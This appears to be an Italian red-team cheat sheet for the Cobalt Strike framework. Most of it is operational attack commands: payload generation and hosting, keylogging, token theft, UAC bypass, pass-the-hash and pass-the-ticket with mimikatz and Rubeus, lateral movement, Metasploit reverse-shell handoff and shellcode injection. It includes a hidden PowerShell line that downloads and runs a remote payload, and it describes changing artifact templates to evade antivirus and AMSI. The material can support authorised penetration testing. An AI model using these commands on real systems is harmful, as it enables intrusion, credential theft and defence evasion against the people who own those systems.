# Cobalt Strike

### Ascoltatori

### Ascoltatori C2

`Cobalt Strike -> Ascoltatori -> Aggiungi/Modifica` quindi puoi selezionare dove ascoltare, quale tipo di beacon utilizzare (http, dns, smb...) e altro.

### Ascoltatori Peer2Peer

I beacon di questi ascoltatori non hanno bisogno di comunicare direttamente con il C2, possono comunicare con esso attraverso altri beacon.

`Cobalt Strike -> Ascoltatori -> Aggiungi/Modifica` quindi devi selezionare i beacon TCP o SMB

* Il **beacon TCP imposterà un ascoltatore sulla porta selezionata**. Per connettersi a un beacon TCP utilizzare il comando `connect <ip> <port>` da un altro beacon
* Il **beacon smb ascolterà in un nome di pipe con il nome selezionato**. Per connettersi a un beacon SMB è necessario utilizzare il comando `link [target] [pipe]`.

### Genera e ospita payload

#### Genera payload in file

`Attacchi -> Pacchetti ->`&#x20;

* **`HTMLApplication`** per file HTA
* **`Macro di MS Office`** per un documento di Office con una macro
* **`Eseguibile Windows`** per un .exe, .dll o servizio .exe
* **`Eseguibile Windows (S)`** per un **stageless** .exe, .dll o servizio .exe (meglio stageless che staged, meno IoC)

#### Genera e ospita payload

`Attacchi -> Web Drive-by -> Consegna Web Scriptata (S)` Questo genererà uno script/eseguibile per scaricare il beacon da cobalt strike in formati come: bitsadmin, exe, powershell e python

#### Ospita payload

Se hai già il file che desideri ospitare in un server web vai su `Attacchi -> Web Drive-by -> Ospita File` e seleziona il file da ospitare e la configurazione del server web.

### Opzioni Beacon

<pre class="language-bash"><code class="lang-bash"># Esegui un binario .NET locale
execute-assembly &#x3C;/percorso/al/file.exe>

# Screenshot
printscreen    # Scatta una singola schermata utilizzando il metodo PrintScr
screenshot     # Scatta una singola schermata
screenwatch    # Scatta periodicamente schermate del desktop
## Vai su Visualizza -> Schermate per vederle

# Keylogger
keylogger [pid] [x86|x64]
## Visualizza > Tasti premuti per vedere i tasti premuti

# Scansione porte
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inietta l'azione di scansione porte in un altro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importa il modulo Powershell
powershell-import C:\percorso\PowerView.ps1
powershell &#x3C;scrivi qui il comando powershell>

# Impersonazione utente
## Generazione token con credenziali
make_token [DOMINIO\utente] [password] # Crea un token per impersonare un utente nella rete
ls \\nome_computer\c$ # Prova a utilizzare il token generato per accedere a C$ in un computer
rev2self # Smetti di utilizzare il token generato con make_token
## L'uso di make_token genera l'evento 4624: un account è stato effettuato l'accesso con successo. Questo evento è molto comune in un dominio Windows, ma può essere limitato filtrando il tipo di accesso. Come accennato in precedenza, utilizza LOGON32_LOGON_NEW_CREDENTIALS che è il tipo 9.

# Bypass UAC
elevate svc-exe &#x3C;ascoltatore>
elevate uac-token-duplication &#x3C;ascoltatore>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Ruba token da pid
## Come make_token ma rubando il token da un processo
steal_token [pid] # Inoltre, questo è utile per azioni di rete, non per azioni locali
## Dalla documentazione dell'API sappiamo che questo tipo di accesso "consente al chiamante di clonare il proprio token corrente". Ecco perché l'output di Beacon dice Impersonated &#x3C;current_username> - sta impersonando il nostro token clonato.
ls \\nome_computer\c$ # Prova a utilizzare il token generato per accedere a C$ in un computer
rev2self # Smetti di utilizzare il token rubato da steal_token

## Avvia un processo con nuove credenziali
spawnas [dominio\nome_utente] [password] [ascoltatore] # Fallo da una directory con accesso in lettura come: cd C:\
## Come make_token, questo genererà l'evento Windows 4624: un account è stato effettuato l'accesso con successo, ma con un tipo di accesso 2 (LOGON32_LOGON_INTERACTIVE). Verranno dettagliati l'utente chiamante (TargetUserName) e l'utente impersonato (TargetOutboundUserName).

## Inietta in un processo
inject [pid] [x64|x86] [ascoltatore]
## Da un punto di vista OpSec: non eseguire l'iniezione cross-platform a meno che non sia strettamente necessario (ad es. x86 -> x64 o x64 -> x86).

## Passa l'hash
## Questa modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è molto fattibile se Protected Process Light (PPL) è abilitato.
pth [pid] [arch] [DOMINIO\utente] [hash NTLM]
pth [DOMINIO\utente] [hash NTLM]

## Passa l'hash tramite mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMINIO> /ntlm:&#x3C;HASH NTLM> /run:"powershell -w hidden"
## Senza /run, mimikatz genera un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
steal_token &#x3C;pid> #Rubare il token dal processo creato da mimikatz

## Passa il ticket
## Richiedi un ticket
execute-assembly C:\percorso\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;dominio> /aes256:&#x3C;chiavi_aes> /nowrap /opsec
## Crea una nuova sessione di accesso da utilizzare con il nuovo ticket (per non sovrascrivere quello compromesso)
make_token &#x3C;dominio>\&#x3C;nome_utente> DummyPass
## Scrivi il ticket nella macchina dell'attaccante da una sessione poweshell &#x26; caricalo
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Passa il ticket da SYSTEM
## Genera un nuovo processo con il ticket
execute-assembly C:\percorso\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMINIO> /aes256:&#x3C;CHIAVE AES> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ruba il token da quel processo
steal_token &#x3C;pid>

## Estrai il ticket + Passa il ticket
### Elenca i ticket
execute-assembly C:\percorso\Rubeus.exe triage
### Dump ticket interessanti per luid
execute-assembly C:\percorso\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Creare una nuova sessione di accesso, prendere nota di luid e processid
execute-assembly C:\percorso\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Inserire il ticket nella sessione di accesso generata
execute-assembly C:\percorso\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Infine, rubare il token da quel nuovo processo
steal_token &#x3C;pid>

# Movimento laterale
## Se è stato creato un token, verrà utilizzato
jump [metodo] [destinazione] [ascoltatore]
## Metodi:
## psexec                    x86   Utilizza un servizio per eseguire un artefatto EXE del servizio
## psexec64                  x64   Utilizza un servizio per eseguire un artefatto EXE del servizio
## psexec_psh                x86   Utilizza un servizio per eseguire una riga di comando di PowerShell
## winrm                     x86   Esegui uno script di PowerShell tramite WinRM
## winrm64                   x64   Esegui uno script di PowerShell tramite WinRM

remote-exec [metodo] [destinazione] [comando]
## Metodi:
<strong>## psexec                          Esegui in remoto tramite Service Control Manager
</strong>## winrm                           Esegui in remoto tramite WinRM (PowerShell)
## wmi                             Esegui in remoto tramite WMI

## Per eseguire un beacon con wmi (non è presente nel comando jump) basta caricare il beacon ed eseguirlo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Passare la sessione a Metasploit - Attraverso l'ascoltatore
## Sull'host di Metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Su cobalt: Listeners > Add e impostare il Payload su Foreign HTTP. Impostare l'Host su 10.10.5.120, la Porta su 8080 e fare clic su Salva.
beacon> spawn metasploit
## Puoi spawnare solo sessioni Meterpreter x86 con l'ascoltatore esterno.

# Passare la sessione a Metasploit - Attraverso l'iniezione di shellcode
## Sull'host di Metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Esegui msfvenom e prepara l'ascoltatore multi/handler

## Copia il file bin su cobalt strike host
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inietta il codice shell di metasploit in un processo x64

# Passare la sessione di metasploit a cobalt strike
## Genera lo stageless Beacon shellcode, vai su Attacks > Packages > Windows Executable (S), seleziona l'ascoltatore desiderato, seleziona Raw come tipo di output e seleziona Use x64 payload.
## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il codice shell di cobalt strike generato


# Pivoting
## Apri un proxy socks nel teamserver
beacon> socks 1080

# Connessione SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Evitare gli AV

### Kit di artefatti

Di solito in `/opt/cobaltstrike/artifact-kit` puoi trovare il codice e i modelli precompilati (in `/src-common`) dei payload che cobalt strike utilizzerà per generare i beacon binari.

Utilizzando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con il backdoor generato (o solo con il modello compilato) puoi scoprire cosa fa scattare il defender. Di solito si tratta di una stringa. Pertanto, puoi semplicemente modificare il codice che genera il backdoor in modo che quella stringa non appaia nel binario finale.

Dopo aver modificato il codice, esegui `./build.sh` dalla stessa directory e copia la cartella `dist-pipe/` nel client Windows in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Non dimenticare di caricare lo script aggressivo `dist-pipe\artifact.cna` per indicare a Cobalt Strike di utilizzare le risorse dal disco che desideriamo e non quelle caricate.

### Kit delle risorse

La cartella ResourceKit contiene i modelli per i payload basati su script di Cobalt Strike, inclusi PowerShell, VBA e HTA.

Utilizzando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con i modelli è possibile individuare ciò che non piace al difensore (in questo caso AMSI) e modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando le righe rilevate è possibile generare un modello che non verrà rilevato.

Non dimenticare di caricare lo script aggressivo `ResourceKit\resources.cna` per indicare a Cobalt Strike di utilizzare le risorse dal disco che desideriamo e non quelle caricate.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

